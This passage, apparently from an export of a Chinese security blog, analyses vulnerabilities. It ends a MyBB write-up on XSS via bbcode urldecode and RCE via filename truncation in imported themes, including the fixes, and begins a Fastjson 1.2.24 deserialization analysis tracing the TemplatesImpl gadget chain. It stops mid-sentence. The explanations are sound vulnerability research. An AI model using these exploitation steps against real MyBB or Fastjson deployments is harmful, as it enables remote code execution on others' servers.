alt=\"49\"></a></p>\n<p>此时将要插入表中name字段的值为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css，由于mysql默认字段长度为30字符，而我们的name长度为34字符，所以，.css会被截断，最终插入表中name字段的值为aaaaaaaaaaaaaaaaaaaaaaaaaa.php。</p>\n<p>与此同时，aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css中的内容，会插入到stylesheet字段中，我们构造的payload随同aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css中的内容，一同写入数据库。</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453146_50.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453146_50.png\" alt=\"50\"></a></p>\n<p>程序在执行xml数据从解析到入库的操作的同时，也会在本地生成对应的文件，如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453593_51.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453593_51.png\" alt=\"51\"></a></p>\n<p>这里生成文件名仍是.css后缀。原因很好理解：这里生成的文件名由解析上传的xml文件中的css name值决定的，如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453755_52.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408453755_52.png\" alt=\"52\"></a></p>\n<p>因此后缀为.css</p>\n<p>&nbsp;</p>\n<p>接下来在后台页面中，查看我们刚刚导入的theme</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454088_53.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454088_53.png\" alt=\"53\"></a></p>\n<p>可以看到我们grq themes里的css列表中，后缀已经变为php</p>\n<p>这是为什么呢？原因很简单，因为此处展示的内容，是从数据库中查询得到，此时数据库内容如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454318_54.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454318_54.png\" alt=\"54\"></a></p>\n<p>数据库由于30字符最大长度的截断，已经把入库的文件名后的.css截断了，此时数据库中name的后缀变为php</p>\n<p>这时，点击Stylesheets in grq 列表中的aaaaaaaaaaaaaaaaaaaaaaaaaa.php，进入编辑页面</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454721_55.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408454721_55.png\" alt=\"55\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455075_56.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455075_56.png\" alt=\"56\"></a></p>\n<p>再次查看后台文件夹，可见生成了一个.php后缀文件，如下图</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040845533_57.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040845533_57.png\" alt=\"57\"></a></p>\n<p>这里的原理也很简单。点击编辑css文件时，程序会从数据库中读取该文件的name以及内容，</p>\n<p>并判断在指定目录中是否存在，若不存在，则用数据库中取出的name为文件名，生成文件，并将数据库中取出的内容写入该文件中</p>\n<p>由于此时库中的name为aaaaaaaaaaaaaaaaaaaaaaaaaa.php，所以在指定位置生成了aaaaaaaaaaaaaaaaaaaaaaaaaa.php文件</p>\n<p>下面跟下php文件生成的流程与代码</p>\n<p>在点击aaaaaaaaaaaaaaaaaaaaaaaaaa.php，进入其编辑页面这个操作</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455691_58.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455691_58.png\" alt=\"58\"></a></p>\n<p>&nbsp;</p>\n<p>此时发送请求如下</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455935_59.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408455935_59.png\" alt=\"59\"></a></p>\n<p>后台代码执行如下：</p>\n<p>首先进入</p>\n<p>\\admin\\modules\\style\\themes.php</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460279_60.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460279_60.png\" alt=\"60\"></a></p>\n<p>此时的action为edit_stylesheet，进入上图分支</p>\n<p>接着从数据库中查询该条数据，执行的sql语句如下</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460538_61.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408460538_61.png\" alt=\"61\"></a></p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040846089_62.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/201909040846089_62.png\" alt=\"62\"></a></p>\n<p>查询结果如上图</p>\n<p>&nbsp;</p>\n<p>最后将库中内容写入文件，文件名即为库中name字段，文件内容即为库中stylesheet字段</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461176_63.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461176_63.png\" alt=\"63\"></a></p>\n<p>如上图，构造的payload被写入aaaaaaaaaaaaaaaaaaaaaaaaaa.php</p>\n<p>&nbsp;</p>\n<p>打开aaaaaaaaaaaaaaaaaaaaaaaaaa.php，可见payload成功写入</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461455_64.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461455_64.png\" alt=\"64\"></a></p>\n<p>&nbsp;</p>\n<p>访问该文件</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461889_65.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408461889_65.png\" alt=\"65\"></a></p>\n<p>Phpinfo执行成功</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h2 id=\"0x03-漏洞分析时发现的问题\"><a href=\"#0x03-漏洞分析时发现的问题\" class=\"headerlink\" title=\"0x03 漏洞分析时发现的问题\"></a><strong>0x03 漏洞分析时发现的问题</strong></h2><hr>\n<h3 id=\"1-sql-mode默认值问题\"><a href=\"#1-sql-mode默认值问题\" class=\"headerlink\" title=\"1. sql_mode默认值问题\"></a><strong>1. sql_mode默认值问题</strong></h3><p>笔者在尝试构造与复现rce漏洞时，当构造34字符长度文件名，以便通过mysql最大长度截断机制截断时，出现的如下问题：</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462238_66.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462238_66.png\" alt=\"66\"></a></p>\n<p>Data too long~</p>\n<p>笔者使用的是Wamp环境，在查看安装的mysql配置时，发现默认sql_mode为STRICT_ALL_TABLES，如下图：</p>\n<p><a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462511_67.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462511_67.png\" alt=\"67\"></a></p>\n<p>STRICT_ALL_TABLES：</p>\n<p>对所有引擎的表都启用严格模式。(STRICT_TRANS_TABLES只对支持事务的表启用严格模式)。</p>\n<p>在严格模式下，一旦任何操作的数据产生问题，都会终止当前的操作。对于启用STRICT_ALL_TABLES选项的非事务引擎来说，这时数据可能停留在一个未知的状态。这可能不是所有非事务引擎愿意看到的一种情况，因此需要非常小心这个选项可能带来的潜在影响。</p>\n<p>在严格模式下，超长的字符串，不能被截断入库，因此这里可能会影响到该漏洞的利用</p>\n<p>###</p>\n<h3 id=\"2-urldecode的必要性\"><a href=\"#2-urldecode的必要性\" class=\"headerlink\" title=\"2.urldecode的必要性\"></a>2.urldecode的必要性</h3><p>在xss漏洞中，漏洞作者原文有一段描述如下</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462865_68.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408462865_68.png\" alt=\"68\"></a></p>\n<p>漏洞作者在他的文章中这样描述</p>\n<p>“通常，由于正则表达式过滤器可以防止此类攻击，因此无法在其他bbcodes中注入bbcodes。但是，对于呈现[video] bbcodes的回调方法会在应嵌入的视频的URL上调用urldecode（）。视频URL被urldecoded，这将允许绕过正则表达式保护并通过URL编码注入。”</p>\n<p>从作者的描述来看，正是因为此处的urldecode存在，导致被url编码后的payload可以绕过正则防护，从而造成注入。根据作者描述，构建的流程如下：</p>\n<p>1.Payload-&gt;正则过滤器-&gt;检测不通过-&gt;失败</p>\n<p>2.url编码后的payload-&gt;正则过滤器-&gt;检测通过-&gt;urldecode-&gt;还原为明文payload-&gt;注入成功</p>\n<p>但是在我实际分析中，发现根本不需要对payload进行URL编码，正如上文我构造的pyaload，无需编码仍可触发漏洞。而且，也没有在urldecode执行前，发现正则过滤器</p>\n<h3 id=\"3-RCE漏洞的入口\"><a href=\"#3-RCE漏洞的入口\" class=\"headerlink\" title=\"3.RCE漏洞的入口\"></a>3.RCE漏洞的入口</h3><p>关于RCE漏洞的入口，作者原文描述如下:</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463197_69.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463197_69.png\" alt=\"69\"></a></p>\n<p>在此处，作者多次提到create与choose the filename字眼，一度让我认为漏洞存在于创建与修改Theme处，如下图</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463671_70.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463671_70.png\" alt=\"70\"></a></p>\n<p>或是修改Template Name处，如下图</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463921_71.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408463921_71.png\" alt=\"71\"></a></p>\n<p>在尝试寻找rce入口时，发现一处有意思的地方，当修改templates为aaaaaaaaaaaaaaaaaaaaaaaaaa.php.css时</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464218_72.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464218_72.png\" alt=\"72\"></a></p>\n<p>保存后，程序会将.css截断，并提示后缀问题，如下图</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464587_73.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464587_73.png\" alt=\"73\"></a></p>\n<p>在跟踪此处代码时发现，在修改template name时，程序是会检查文件名长度并截断的，控制template name长度为30字符，如下图</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464861_74.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408464861_74.png\" alt=\"74\"></a></p>\n<p>这里可以印证，漏洞入口并不在修改名字和创建template处，经过后来的分析与寻找，才找到上文中真正的入口点，也就是Import a Theme处。但是从这个过程可见，mybb对文件名长度还是有一定限制的，只是防护的有疏漏，忘记检查导入的xml结构中的name字段长度。</p>\n<p>&nbsp;</p>\n<h2 id=\"0x04-漏洞修复\"><a href=\"#0x04-漏洞修复\" class=\"headerlink\" title=\"0x04 漏洞修复\"></a><strong>0x04 漏洞修复</strong></h2><hr>\n<h3 id=\"xss漏洞\"><a href=\"#xss漏洞\" class=\"headerlink\" title=\"xss漏洞\"></a><strong>xss漏洞</strong></h3><p>针对xss漏洞，使用encode_url方法替换原来的htmlspecialchars_uni，如下图</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465133_75.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465133_75.png\" alt=\"75\"></a></p>\n<p>回顾上文，在漏洞利用中，id中的内容为嵌套的url bbcod代码</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465356_76.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465356_76.png\" alt=\"76\"></a></p>\n<p>当id被url编码后，之后在通过正则解析url bbcod代码时，该处被编码后的内容就不会被正则匹配到，从而防止嵌套解析造成xss漏洞</p>\n<h3 id=\"RCE漏洞\"><a href=\"#RCE漏洞\" class=\"headerlink\" title=\"RCE漏洞\"></a>RCE漏洞</h3><p>针对rce漏洞，使用my_substr方法限制name长度为30字符，如下图</p>\n<p> <a href=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465669_77.png\"><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/09/2019090408465669_77.png\" alt=\"77\"></a></p>"},{"title":"Fastjson 1.2.24反序列化漏洞深度分析","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Hippopx(1).jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","date":"2020-07-17T03:05:38.000Z","_content":"\n Fastjson 1.2.24反序列化漏洞深度分析\n====================================\n\n前言\n----\n\nFastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象。近几年来fastjson漏洞层出不穷，本文将会谈谈近几年来fastjson RCE漏洞的源头：17年fastjson爆出的1.2.24反序列化漏洞。以这个漏洞为基础，详细分析fastjson漏洞的一些细节问题。\n\n关于Fastjson 1.2.24反序列化漏洞，自从17年以来已经有很多人分析过了，一些基础内容本文就不再陈述了。此次漏洞简单来说，就是Fastjson通过parseObject/parse将传入的字符串反序列化为Java对象时由于没有进行合理检查而导致的\n\n本文将着重分析一下这个漏洞没有被详细介绍过的细节问题，如下：\n\n1.  parseObject(String text) 、parse (String text)、 parseObject(String text, Class\\<T\\> clazz)三个方法从代码层面上来看，究竟有何不同？\n2. 使用TemplatesImpl攻击调用链路构造poc时，为什么一定需要构造_tfactory以及_name字段？\n3. _outputProperties与其getter方法getOutputProperties()方法名字并不完全一致是如何解决的？\n\n除此之外，本文在介绍TemplatesImpl攻击调用链路时，以模拟寻找漏洞利用链的思路，从最终的执行点开始向上寻找入口，模拟还原出挖掘这个TemplatesImpl利用链的完整过程。\n\n漏洞分析\n--------\n\n关于parse (String text) 、parseObject(String text)、 parseObject(String text, Class\\<T\\> clazz)三个方法，我们进行一个测试\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2a482f1a4f410547c0ac9a3b7876dffa.png)\n\nFastJsonTest类中变量以及其setter/getter关系如下表\n\n|        | public String t1 | private int t2 | private Boolean t3 | private Properties t4 | private Properties t5 |\n| ------ | ---------------- | -------------- | ------------------ | --------------------- | --------------------- |\n| setter | 有               | 有             | 无                 | 无                    | 有                    |\n| getter | 有               | 有             | 有                 | 有                    | 有                    |\n\n接下来，我们分别使用下图三种方式分别将JSON字符串反序列化成Java对象\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a5968e24e6caa97be9562234c80400e8.png)\n\n1. Object obj = JSON.parse(jsonstr);\n2. Object obj = JSON.parseObject(jsonstr, FastJsonTest.class);\n3. Object obj = JSON.parseObject(jsonstr);\n\n首先我们运行一下Object obj = JSON.parse(jsonstr);这种方式\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d4d30014d4d24a2897bfa65da386fec4.png)\n\n结果：\n\n- setT1() 、setT2() 、getT4() 、setT5() 被调用\n\n- JSON.parse(jsonstr)最终返回FastJsonTest类的对象\n\n接着我们运行下Object obj = JSON.parseObject(jsonstr, FastJsonTest.class);\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/888051938003f40fb97aa91a724e5887.png)\n\n结果：\n\n- 与JSON.parse(jsonstr);这种方式一样setT1() 、setT2() 、getT4() 、setT5() 被调用\n\n- JSON.parse(jsonstr)最终返回FastJsonTest类的对象\n\n最后我们运行下Object obj = JSON.parseObject(jsonstr);\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/21c2453ce372bcfc605f96bb97a9fdc4.png)\n\n结果：\n\n- 这次结果与上两次大不相同，FastJsonTest类中的所有getter与setter都被调用\n- JSON.parseObject(jsonstr);返回一个JSONObject对象\n\n通过上文运行结果，不难发现有三个问题\n\n1. 使用JSON.parse(jsonstr);与JSON.parseObject(jsonstr, FastJsonTest.class);两种方式执行后的返回结果完全相同，且FastJsonTest类中getter与setter方法调用情况也完全一致，parse(jsonstr)与parseObject(jsonstr, FastJsonTest.class)有何关联呢？\n2. 使用JSON.parse(jsonstr);与JSON.parseObject(jsonstr, FastJsonTest.class);两种方式时，被调用的getter与setter方法分别为setT1()、setT2()、setT5()、getT4()。FastJsonTest类中一共有五个getter方法，分别为getT1()、getT2()、getT3()、getT4()、getT5()，为什么仅仅getT4被调用了呢?\n3. JSON.parseObject(jsonstr);为什么返回值为JSONObject类对象，且将FastJsonTest类中的所有getter与setter都被调用了?\n\n### 问题一解答\n\n>  使用JSON.parse(jsonstr);与JSON.parseObject(jsonstr, FastJsonTest.class);两种方式执行后的返回结果完全相同，且FastJsonTest类中getter与setter方法调用情况也完全一致，parse(jsonstr)与parseObject(jsonstr, FastJsonTest.class)有何关联呢？\n\n经过调试可以发现，无论使用JSON.parse(jsonstr);或是JSON.parseObject(jsonstr, FastJsonTest.class);方式解析json字符串，程序最终都会调用位于com/alibaba/fastjson/util/JavaBeanInfo.java中的JavaBeanInfo.build()方法来获取并保存目标Java类中的成员变量以及其对应的setter、getter\n\n首先来看下JSON.parse(jsonstr)这种方式，当程序执行到JavaBeanInfo.build()方法时情景如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/0c9cd8220940fbcb60fc3bb987a34b15.png)\n\n此时的调用链如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1f5f848eaa7b8c1af2ea4febf61ba3a9.png)\n\n此时传入JavaBeanInfo.build() 方法的参数值如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3bd0543cc0dc52a33e44fca9b345c270.png)\n\n再来看下JSON.parseObject(jsonstr, FastJsonTest.class)这种方式，当程序执行到JavaBeanInfo.build() 方法时情景如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/440177acd687179a1be554c61759897f.png)\n\n此时的调用链如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d05b4a2272ab1219c192345455013b0c.png)\n\n此时传入JavaBeanInfo.build() 方法的参数值如下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/80d1735b7c2742cf729ba6729b5e189e.png)\n\n二者执行到JavaBeanInfo.build() 方法时调用链对比如下\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/21ee55654a62cb8f7750458052485dfe.png)\n\n可见二者后面的调用链是完全一样的。二者不同点在于调用JavaBeanInfo.build()\n方法时传入clazz参数的来源不同：\n\n- JSON.parseObject(jsonstr, FastJsonTest.class)在调用JavaBeanInfo.build()方法时传入的clazz参数源于parseObject方法中第二个参数中指定的“FastJsonTest.class”。\n\n- JSON.parse(jsonstr);这种方式调用JavaBeanInfo.build()方法时传入的clazz参数获取于json字符串中\\@type字段的值。\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f0c8407956fe7df0df4b42b3199b6e2a.png)\n\n关于JSON.parse(jsonstr);从json字符串中\\@type字段获取clazz参数，具体代码如下\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2757daa1052b75266d159af6096ed25e.png)\n\n程序通过解析传入的json字符串的\\@type字段值来获取之后传入JavaBeanInfo.build()方法的clazz参数\n\n因此，只要Json字符串的\\@type字段值与JSON.parseObject(jsonstr, FastJsonTest.class);中第二个参数中类名一致，见下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2d3c790ca89e2d2ed8999c4f170ffe92.png)\n\nJSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)这两种方式执行的过程与结果是完全一致的。二者唯一的区别就是获取clazz参数的途径不同\n\n### 问题二解答\n\n>   使用JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)两种方式时，被调用的getter与setter方法分别为setT1()、setT2()、setT5()、getT4()。FastJsonTest类中一共有五个getter方法，分别为getT1()、getT2()、getT3()、getT4()、getT5()，为什么仅仅getT4被调用了呢?\n\n这个问题要从JavaBeanInfo.build() 方法中获取答案：\n\n通过上文的分析可以发现，程序会使用JavaBeanInfo.build()方法对传入的json字符串进行解析。在JavaBeanInfo.build()方法中，程序将会创建一个fieldList数组来存放后续将要处理的目标类的 setter方法及某些特定条件的 getter方法。通过上文的结果可见，目标类中所有的setter方法都可以被调用，但只有getT4()这一个getter被调用，那么到底什么样的getter方法可以满足要求并被加入fieldList数组中呢？\n\n在JavaBeanInfo.build() 方法可见如下代码\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6ba89b567b638379ac0955cf3ee0e318.png)\n\n程序从clazz（目标类对象）中通过getMethods获取本类以及父类或者父接口中所有的公共方法，接着进行循环判断这些方法是否可以加入fieldList中以便后续处理\n\n条件一、方法名需要长于4\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3ba4f3c36c37c86019bd3e46a81de0b2.png)\n\n条件二、不是静态方法\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d63f0488efd86adc06ef29945da02942.png)\n\n条件三、以get字符串开头，且第四个字符需要是大写字母\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b01f974fd81355c9ace3ba5f6222a4d8.png)\n\n条件四、方法不能有参数传入\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/87ac3c7ff9cb6348d836cf02a97a5f7e.png)\n\n条件五、继承自Collection \\|\\| Map \\|\\| AtomicBoolean \\|\\| AtomicInteger \\|\\|\nAtomicLong\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/95ac194ec336d6e610097b3b038b254b.png)\n\n条件六、此getter不能有setter方法（程序会先将目标类中所有的setter加入fieldList列表，因此可以通过读取fieldList列表来判断此类中的getter方法有没有setter）\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1544f565ed123a2f83dff21f3e2bc05f.png)\n\n### 问题三解答\n\n> JSON.parseObject(jsonstr);为什么返回值为JSONObject类对象，且将FastJsonTest类中的所有getter与setter都被调用了?\n\n通过上文的分析可以发现，JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)两种方式从执行流程几乎一样，结果也完全相同；然而使用JSON.parseObject(jsonstr)这种方式，执行的结果与返回值却与前两者不同：JSON.parseObject(jsonstr)返回值为JSONObject类对象，且将FastJsonTest类中的所有getter与setter都被调用。\n\n通过阅读源码可以发现JSON.parseObject(String text)实现如下\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b856db3404b87d708cd00edfbbd9ee30.png)\n\nparseObject(String text)其实就是执行了parse(),随后将返回的Java对象通过JSON.toJSON（）转为JSONObject对象。\n\nJSON.toJSON()方法会将目标类中所有getter方法记录下来，见下图\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ce86b2ba9f56c78fdddea1d1e030dedb.png)\n\n随后通过反射依次调用目标类中所有的getter方法\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a657b27f84e6bbeeb8f70706ba9108fa.png)\n\n完整的调用链如下\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/c7b24c882c04cc7e6c42a423176985be.png)\n\n总结：\n\n上文例子中，JSON.parse(jsonstr)与JSON.parseObject(jsonstr, FastJsonTest.class)可以认为是完全一样的，而parseObject(String text)是在二者的基础上又执行了一次JSON.toJSON()\n\nparse(String text)、parseObject(String text)与parseObject(String text, Class\\<T\\> clazz)目标类Setter\\\\Getter调用情况\n\n|                | parse(String text) | parseObject(String text) | parseObject(String text, Class\\<T\\> clazz) |\n| -------------- | ------------------ | ------------------------ | ------------------------------------------ |\n| Setter调用情况 | 全部               | 全部                     | 全部                                       |\n| Getter调用情况 | 部分               | 全部                     | 部分                                       |\n\n此外，如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用Feature.SupportNonPublicField参数。（在下文中，为TemplatesImpl类中无setter方法的私有变量_tfactory以及_name赋值运用到的就是这个知识点）\n\nTemplatesImpl攻击调用链路\n-------------------------\n\n针对于上文的分析可以发现，无论使用哪种方式处理JSON字符串，都会有机会调用目标类中符合要求的Getter方法\n\n如果一个类中的Getter方法满足调用条件并且存在可利用点，那么这个攻击链就产生了。\n\nTemplatesImpl类恰好满足这个要求：\n\ncom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中存在一个名为_outputPropertiesget的私有变量，其getter方法中存在利用点，这个getter方法恰好满足了调用条件，在JSON字符串被解析时可以调用其在调用FastJson.parseObject()序列化为Java对象时会被调用，下面我们详细说明一下：\n\n首先我们从漏洞点开始，一层层往入口分析：首先看一下TemplatesImpl类中的getTransletInstance方法\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/dafa5052e153c29eb5d22bb0ff4c69f5.png)\n\n其中455行调用_class[_transletIndex]的newInstance( )方法来实例化对象的操作\n\n我们看一下_class[_transletIndex]是如何获取的，是否可以控制_class与_transletIndex值皆由451行处defineTransletClasses()方法中获取\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3ee4112a8a2ea2b7000c82d287fb3201.png)\n\n我们跟入defineTransletClasses()方法中一探究竟\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/62b59f97a0c97819aabac6c2ac1de16a.png)\n\n在defineTransletClasses()方法中，首先在393行判断_bytecodes值是否为空\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/42e45309e4d50cc3bb655dab8a23df91.png)\n\n值得注意的是，_bytecodes变量是TemplatesImpl类的成员变量\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5254995c16eeb34452e0a82cbac85b46.png)\n\n因此_bytecodes变量可以在构造json字符串时传入，在构造poc时属于可控变量 _bytecodes变量非空值时，程序将会继续执行至下图红框处\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/6bbe808584d5a8e5d3c7b24d41400b7e.png)\n\n\n此时，需要满足_tfactory变量不为null，否则导致程序异常退出。这就是为什么公开的poc中需要设置设置_tfactory为{}的原因。因为_tfactory为私有变量，且无setter方法，这里需要指定Feature.SupportNonPublicField参数来为_tfactory赋值\n\n接下来，程序将会把_bytecodes变量中的值循环取出并通过loader.defineClass处理后赋值给_class[i]\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5fae284f08e0da8a0517fa9f43990c80.png)\n\n我们首先来看下loader.defineClass方法是什么\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/ec061c3b3c86c1b3a02482df692a8eea.png)\n\n可见，loader.defineClass方法其实就是对ClassLoader.defineClass的重写。defineClass方法可以从传入的字节码转化为Class\n\n回头分析下上述流程\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5fae284f08e0da8a0517fa9f43990c80.png)\n\n\\_bytecodes变量非空值时，程序将会把_bytecodes数组中的值循环取出，使用loader.defineClass方法从字节码转化为Class对象，随后后赋值给_class[i]。如果此时的class为main class，_transletIndex变量值则会是此时_bytecodes数组中的下标值.因此当我们构造出_bytecodes:[evilCode]这样的json字符串（evilCode字符串为我们构造的恶意类的字节码）后，程序会将evilCode化为Class对象后赋值给_class[0]\n\n现在回到getTransletInstance()方法中\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/7485cd6227bab22112407edb3fc801c2.png)\n\n此时的_class[_transletIndex]即为我们构造传入的evilCode类.程序通过调用evilCode类的newInstance()方法来实例化对象的操作，这将导致我们构造的evilCode类中的恶意代码被执行.但在此之前，需要在poc构造json字符串时使得成员变量_name不为空，否则程序还未执行到将evilCode类实例化就提前return\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/36340dd97c18b7074c08d30fd9fce4b7.png)\n\n注意：由于私有变量_name没有setter方法，在反序列化时想给这个变量赋值则需要使用Feature.SupportNonPublicField参数。\n\n在分析完存在漏洞的getTransletInstance方法，我们需要找到一条调用链，这条调用链需要在使用fastjson处理json字符串时成功串连到存在漏洞的getTransletInstance方法上。我们继续向上跟踪代码\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a99fa86415c1e44425807b808c4feff6.png)\n\ncom/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java中newTransformer()方法中调用了getTransletInstance()。继续向上跟踪\n\n![](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/873e4c395da9922f4755f03fdb6142e5.png)\n\ncom/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java 